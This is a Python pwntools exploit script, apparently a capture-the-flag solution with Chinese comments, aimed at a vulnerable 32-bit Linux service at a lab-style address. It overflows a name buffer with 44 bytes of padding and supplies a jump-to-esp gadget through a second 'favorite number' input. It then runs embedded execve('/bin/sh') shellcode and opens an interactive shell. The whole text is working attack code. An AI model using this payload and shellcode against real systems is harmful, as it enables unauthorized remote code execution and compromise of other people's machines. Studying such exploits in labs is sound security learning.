#!/usr/bin/python
#coding:utf-8
#esp是栈上面的一层

from pwn import *
from struct import unpack

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

jump2shellcode = 0x0804a048		#此处内容会被修改成FF E4 = jmp esp
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = ""
payload += "A"*44	#padding
payload += p32(jump2shellcode)	#跳到jmp esp
payload += shellcode			#jmp esp跳到shellcode执行

io.recvuntil('What\'s your name?\n')
io.sendline(payload)
io.recvuntil('What\'s your favorite number?\n')
io.sendline(str(0xe4ff))		#大端序，FF E4 = jmp esp

io.interactive()